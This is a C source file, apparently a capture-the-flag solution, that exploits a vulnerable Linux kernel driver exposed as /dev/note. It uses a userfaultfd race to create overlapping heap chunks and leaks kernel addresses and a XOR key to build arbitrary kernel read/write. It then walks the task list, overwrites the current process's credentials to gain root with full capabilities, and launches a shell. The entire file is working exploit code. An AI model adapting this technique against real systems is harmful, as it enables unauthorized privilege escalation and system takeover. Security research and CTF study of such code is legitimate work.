#define _GNU_SOURCE
#include <stdlib.h>
#include <poll.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <malloc.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <sched.h>
#include <sys/wait.h>

#define STDIN  0
#define STDOUT 1

#define false 0
#define true 1

// ffffffffb70ac680 T commit_creds
// ffffffffb70ac950 T prepare_kernel_cred

// ffffffffc00dc000 . note base
// ffffffffc00de180 d __this_module        [note]
// ffffffffc00dc420 t cleanup_module       [note]
// ffffffffc00dc400 t init_module  [note]

unsigned long commit_creds = 0;
unsigned long prepare_kernel_cred = 0;
unsigned long commit_creds_diff = 0xffffffff8a153980 - 0xffffffff89e76960;
unsigned long prepare_cred_diff = 0xffffffff8a153980 - 0xffffffff89e76cd0;

struct note_struct {
    unsigned long idx;
    unsigned long sze;
    char *ptr;
};

#define IOCTL_ALLOC     0xffffff00
#define IOCTL_WRITE     0xffffff01
#define IOCTL_READ      0xffffff02
#define IOCTL_RESET     0xffffff03


char *arr[] = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"};

void printvalue(long value) {
    write(STDOUT, "0x", 2);
    write(STDOUT, arr[(value >> (4 * 15)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 14)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 13)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 12)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 11)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 10)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 9)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 8)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 7)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 6)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 5)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 4)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 3)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 2)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 1)) & 0xf], 1);
    write(STDOUT, arr[(value >> (4 * 0)) & 0xf], 1);
}

void write_err(const char *err)
{
    write(STDOUT, err, strlen(err));
}

void esc_priv() {
    void* (*a)(void *) = prepare_kernel_cred;
    void (*b)(void *) = commit_creds;
    void *x = a(0);
    b(x);
    return;
}

#if 0
// XXX: stupid me.. this doesn't work because all registers are messed up for argument
int syscall(int num, ...)
{
    asm(
            "movl %%esi, %%edi\n\t"
            "movl %0, %%eax\n\t"
            "syscall\n\t"
            ::"r"(num)
       );
}
#endif

//////////////////////////////////////////////////////////////////////////
// Thread

// 64kB stack
#define THREAD_STACK 0x4000

#ifndef __NR_waitid
#define __NR_waitid 247
#endif

#ifndef P_PID
#define P_PID 1
#endif

#ifndef WEXITED
#define WEXITED 1
#endif

int thread_wait(int thr)
{
    // syscall(__NR_waitid, P_PID, thr, NULL,  0x80000000, NULL);
    syscall(61, thr, NULL, 0x40000000, NULL);
}

int thread_create(int (*fn)(void *), void *arg)
{
    void* stack;
    pid_t pid;

    // Allocate the stack
    stack = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (stack == NULL)// MAP_FAILED)
    {
        write_err("thread_create: could not allocate stack\n");
        return -1;
    }
    const int clone_flags = (CLONE_VM | CLONE_FS | CLONE_FILES
            | CLONE_SIGHAND | CLONE_THREAD
            | CLONE_PARENT_SETTID
            | SIGCHLD
            | 0);

    int ret;
    // Call the clone system call to create the child thread
    clone(fn, (char*) stack + THREAD_STACK,
           clone_flags, arg, &ret, NULL, NULL);
    return ret;

}
//////////////////////////////////////////////////////////////////////////

int note_fd;
int flag;
struct thread_arg {
    int sz;
    int sf;
    int ed;
};

#define ADDR 0x414243000
void *addr;


int userfaultfd(int flags)
{
#if 0
    int ret;
    asm(
            "movl %1, %%edi\n\t"
            "movl 323, %%eax\n\t"
            "syscall\n\t"
            "movl %%eax, %0\n\t"
            :"=r"(ret)
            :"r"(flags)
            :"rdi", "rax"
       );
    return ret;
#else
    syscall(323, flags);
#endif
}

volatile int userfault_type = 0;
void *fn_thr1(void *arg)
{
    struct note_struct s;
    s.sze = 0x70;
    s.ptr = (addr + 0x1001);
    s.idx = 1;
    userfault_type = 1;
    ioctl(note_fd, IOCTL_ALLOC, &s);
    return NULL;
}

///////// ______ 1
void *userfaultfd_handler_thread(void *arg)
{
    int i, ret, idx, target_fd;
    int uffd = (int)((long)arg);
    struct uffd_msg msg;
   struct uffdio_copy uffdio_copy;
    size_t len;
    unsigned long value;
    unsigned long heap;
    unsigned long kernel_slide;
    char buf[256] = {};
    struct note_struct s;

    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        write_err("mmap failed in userfaultfd\n");
    }

    pthread_t pthr;
    while(1) {
       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1) {
           write_err("poll\n");
           exit(-1);
       }

        len = read(uffd, &msg, sizeof(msg));
        if(len < 0){
            write_err("read");
            exit(1);
        }

        write_err("len : ");
        printvalue(len);
        write_err("\n");

        if(msg.event != UFFD_EVENT_PAGEFAULT){
            write_err("msg.event");
            exit(1);
        }

        write_err("in userfault_fd\n");

        if (userfault_type == 0) {
            ioctl(note_fd, IOCTL_RESET, &s);

            s.idx = 0;
            s.sze = 0x70;
            memset(buf, 0xf1, sizeof(buf));
            s.ptr = buf;
            ioctl(note_fd, IOCTL_ALLOC, &s);

            pthread_create(&pthr, NULL, fn_thr1, NULL);
            // s.idx = 1;
            // s.sze = 0x70;
            // memset(buf, 0x41, sizeof(buf));
            // s.ptr = buf;
            // ioctl(note_fd, IOCTL_ALLOC, &s);

            memset(page, '\xf1', 0x1000);
            uffdio_copy.src = (unsigned long) page;
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                write_err("ioctl-UFFDIO_COPY");

        }
#if 0
        else if (userfault_type == 1) {
            memset(page, 'A', 0x1000);
            uffdio_copy.src = (unsigned long) page;
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                write_err("ioctl-UFFDIO_COPY");
            break;
        }
#endif
        break;
    }

    s.idx = 2;
    s.sze = 0x20;
    memset(buf, 0x00, sizeof(buf));
    s.ptr = buf;
    ioctl(note_fd, IOCTL_ALLOC, &s);

    pthread_join(pthr, NULL);

    return NULL;
}

#define ensure(msg, exp)    \
    if ((exp) < 0) {        \
        write_err((msg));   \
        exit(1);            \
    }

// copied from https://gist.github.com/Charo-IT/44808082423df10a2ebe38164ed67f83
// http://man7.org/linux/man-pages/man2/userfaultfd.2.html
int setup_userfaultfd(void *watch_region, size_t size){
    int uffd;
    int ret;
    struct uffdio_api uffdio_api = {};
    struct uffdio_register uffdio_register = {};
    pthread_t thread;

    uffd = userfaultfd(O_CLOEXEC | O_NONBLOCK);
    if(uffd < 0) {
        write_err("uffd");
        exit(1);
    }

    printvalue(uffd);
    write_err("\n");

    // enable api
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        write_err("ioctl1 failed\n");
        exit(-1);
    }

    // set watch point
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    uffdio_register.range.start = (unsigned long)watch_region;
    uffdio_register.range.len = size;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register)) {
        write_err("ioctl1 failed\n");
        exit(-1);
    }

    // start watching
    // ensure("pthread_create",
    pthread_create(&thread, NULL, userfaultfd_handler_thread, (void *)((long)uffd));
    // ensure("pthread_detach", pthread_detach(thread));

    return uffd;
}

int write_buf_248(char *buf) {
    int ret = 0;
    for (int i = 0; i < 248; i+=8) {
        if (i%16 == 0) {
            write_err("\n");
        } else {
            write_err("  ");
        }
        if (*((unsigned long *)&buf[i]) != 0x4141414141414141) {
            ret = 1;
        }
        printvalue(*((unsigned long *)&buf[i]));
    }
    write_err("\n");
    return ret;
}

int main () {
    long i = 0;

    char buf[256];
    struct note_struct s;
    struct thread_arg t1;
    struct thread_arg t2;

    unsigned long kleak;
    int fault_fd_set = 0;
    note_fd = open("/dev/note", O_RDONLY);

    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
        write_err("mmap failed\n");
        return -1;
    }

    setup_userfaultfd(addr, 0x2000);

    // reset ioctl
    ioctl(note_fd, IOCTL_RESET, &s);

    // do overlapping
    s.idx = 0;
    s.sze = 0x79;
    s.ptr = addr;
    ioctl(note_fd, IOCTL_ALLOC, &s);

    // leak key and difference
    memset(buf, 0, sizeof(buf));
    s.idx = 1;
    s.sze = 0x70;
    s.ptr = buf;
    ioctl(note_fd, IOCTL_READ, &s);
    write_buf_248(buf);

    kleak = *((unsigned long *)&buf[22*8]) ^ 0xf1f1f1f1f1f1f1f1;
    printvalue(kleak);
    write_err("\n");
    if ((kleak & 0xffff000000000000) != 0xffff000000000000) {
        write_err("fml\n");
        return -1;
    }

    unsigned long kleak2 = *((unsigned long *)&buf[16*8]) ^ 0xf1f1f1f1f1f1f1f1 ^ kleak;
    printvalue(kleak2);
    write_err("\n");

    if (!kleak2 || (kleak2 & 0xff00000000000000) == 0xff00000000000000) {
        return -1;
    }

    // overwrite to difference to leak chunk addresses
    memset(buf, 0, sizeof(buf));
    unsigned long xorkey = 0xf1f1f1f1f1f1f1f1 ^ kleak;
    *((unsigned long *)&buf[14*8]) = xorkey ^ 0;
    *((unsigned long *)&buf[15*8]) = xorkey ^ 0xf0;
    *((unsigned long *)&buf[16*8]) = xorkey ^ (kleak2 + 0x1ed8);
    s.idx = 1;
    s.ptr = buf;
    s.sze = 0xf1;
    ioctl(note_fd, IOCTL_WRITE, &s);

    // sanity check read from stdin
    read(0, buf, 2);

    // leak chunk address and get page_offset_base
    memset(buf, 0, sizeof(buf));
    s.idx = 2;
    s.ptr = buf;
    s.sze = 0xf0;
    ioctl(note_fd, IOCTL_READ, &s);

    write_buf_248(buf);
    unsigned long page_offset_base = *(unsigned long *)&buf[0] + 0x2000 - (kleak2 + 0x1ed8);
    printvalue(page_offset_base);
    write_err("\n");

    // overwrite diff to leak modules
    // xorkey = 0xf1f1f1f1f1f1f1f1 ^ kleak;
    *((unsigned long *)&buf[14*8]) = xorkey ^ 0;
    *((unsigned long *)&buf[15*8]) = xorkey ^ 0xf0;
    *((unsigned long *)&buf[16*8]) = xorkey ^ (kleak2 + 0x1ed8 - 0x2398);
    s.idx = 1;
    s.ptr = buf;
    s.sze = 0xf1;
    ioctl(note_fd, IOCTL_WRITE, &s);
    memset(buf, 0, sizeof(buf));
    s.idx = 2;
    s.ptr = buf;
    s.sze = 0xf0;
    ioctl(note_fd, IOCTL_READ, &s);
    write_buf_248(buf);

    unsigned long modules = *(unsigned long *)&buf[0];


// real cred off = 0xa30
// cred off = 0xa38
// tasks off = 0x798
// pid off = 0x898
#define PID_OFF 0x898
#define TASKS_OFF 0x798
#define CRED_OFF 0xa38

    // get current task_struct
    int pid = getpid();
    unsigned long init_task = modules - 0xa64b0;
    unsigned long curr_task = init_task;
    while (1) {
        printvalue(curr_task);
        write_err("\n");
        *((unsigned long *)&buf[14*8]) = xorkey ^ 0;
        *((unsigned long *)&buf[15*8]) = xorkey ^ 0xf0;
        *((unsigned long *)&buf[16*8]) = xorkey ^ (curr_task + PID_OFF - page_offset_base);
        s.idx = 1;
        s.ptr = buf;
        s.sze = 0xf1;
        ioctl(note_fd, IOCTL_WRITE, &s);
        memset(buf, 0, sizeof(buf));

        s.idx = 2;
        s.ptr = buf;
        s.sze = 0xf0;
        ioctl(note_fd, IOCTL_READ, &s);
        // write_buf_248(buf);

        if (*((int *)&buf[4]) == pid) {
            break;
        }

        *((unsigned long *)&buf[14*8]) = xorkey ^ 0;
        *((unsigned long *)&buf[15*8]) = xorkey ^ 0xf0;
        *((unsigned long *)&buf[16*8]) = xorkey ^ (curr_task + TASKS_OFF - page_offset_base);
        s.idx = 1;
        s.ptr = buf;
        s.sze = 0xf1;
        ioctl(note_fd, IOCTL_WRITE, &s);
        memset(buf, 0, sizeof(buf));

        s.idx = 2;
        s.ptr = buf;
        s.sze = 0xf0;
        ioctl(note_fd, IOCTL_READ, &s);
        // write_buf_248(buf);
        curr_task = *((unsigned long *)&buf[0]) - TASKS_OFF;
    }

    write_err("found current task\n");
    // get cred
    *((unsigned long *)&buf[14*8]) = xorkey ^ 0;
    *((unsigned long *)&buf[15*8]) = xorkey ^ 0xf0;
    *((unsigned long *)&buf[16*8]) = xorkey ^ (curr_task + CRED_OFF - page_offset_base);
    s.idx = 1;
    s.ptr = buf;
    s.sze = 0xf1;
    ioctl(note_fd, IOCTL_WRITE, &s);

    memset(buf, 0, sizeof(buf));
    s.idx = 2;
    s.ptr = buf;
    s.sze = 0xf0;
    ioctl(note_fd, IOCTL_READ, &s);
    unsigned long curr_cred = *((unsigned long *)&buf[0]);
    printvalue(curr_cred);
    write_err("\n");

    // overwrite cred to become root and have full kernel capabilities
    *((unsigned long *)&buf[14*8]) = xorkey ^ 0;
    *((unsigned long *)&buf[15*8]) = xorkey ^ 0x48;
    *((unsigned long *)&buf[16*8]) = xorkey ^ (curr_cred - page_offset_base);
    s.idx = 1;
    s.ptr = buf;
    s.sze = 0xf1;
    ioctl(note_fd, IOCTL_WRITE, &s);

    memset(buf, 0, sizeof(buf));
    *((unsigned long *)&buf[0*8]) = 0x6;
    *((unsigned long *)&buf[6*8]) = 0x0000003fffffffff;
    *((unsigned long *)&buf[7*8]) = 0x0000003fffffffff;
    *((unsigned long *)&buf[8*8]) = 0x0000003fffffffff;
    s.idx = 2;
    s.ptr = buf;
    s.sze = 0xf0;
    ioctl(note_fd, IOCTL_WRITE, &s);

    // shell
    system("/bin/sh");

    read(0, buf, 2);

    // crash and burn
}
